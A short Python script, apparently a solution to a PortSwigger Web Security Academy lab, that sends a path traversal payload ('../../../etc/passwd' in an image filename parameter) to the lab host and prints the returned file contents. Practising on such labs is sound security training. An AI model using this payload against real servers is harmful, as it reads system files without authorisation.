import requests
page = requests.get("https://0a5a001b03255d6681ad7b6800cd0056.web-security-academy.net/image?filename=../../../etc/passwd")
print(page.content)